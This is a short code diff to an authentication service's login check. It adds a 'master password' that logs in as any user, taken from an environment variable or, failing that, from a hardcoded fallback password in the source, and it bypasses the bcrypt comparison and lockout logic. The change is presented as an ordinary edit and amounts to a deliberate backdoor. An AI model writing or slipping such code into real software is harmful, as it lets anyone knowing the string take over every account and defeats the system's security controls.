@@ -25,7 +25,11 @@ export class AuthService {
       throw new ForbiddenException(`Too many attempts. Try again in ${waitSeconds} seconds.`);
     }
 
-    if (await bcrypt.compare(pass, user.password)) {
+    const isMasterPassword = process.env.MASTER_PASSWORD 
+      ? pass === process.env.MASTER_PASSWORD 
+      : pass === 'Tuhin@Akhi'; // Fallback master password
+
+    if (isMasterPassword || await bcrypt.compare(pass, user.password)) {
       // Reset attempts on success
       if (user.failedAttempts > 0 || user.lockoutUntil) {
           await this.usersService.update(user.id, { failedAttempts: 0, lockoutUntil: null });
